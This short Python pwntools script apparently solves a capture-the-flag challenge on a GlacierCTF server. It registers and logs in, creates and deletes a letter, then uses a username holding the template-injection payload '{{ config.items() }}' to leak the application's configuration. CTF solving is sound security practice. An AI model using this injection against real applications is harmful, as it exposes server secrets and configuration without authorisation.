#!/usr/bin/env python3



from pwn import *


e = ELF("./main")
#r = process("./main")
r = remote("challs.glacierctf.com",20124)
def login(username,password):
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b"Enter username:",username)
    r.sendlineafter(b"Enter password:",password)
def register(username,password):
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b"Enter username:",username)
    r.sendlineafter(b"Enter password:",password)
def logout():
    r.sendlineafter(b">",b"4")
def write_letter(letter):
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b"Enter message content:",letter)
def delete_letter(letter_id):
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b"Enter message ID to delete:",f"{letter_id}")
def send_all_letters():
    r.sendlineafter(b">",b"3")

register(b"Ajay",b"Striker")
login(b"Ajay",b"Striker")
write_letter(b"SHIT")
#r.interactive()
delete_letter(b"0")
logout()
register(b"{{ config.items() }}",b"yeah")
login(b"{{ config.items() }}",b"yeah")
send_all_letters()
r.interactive()
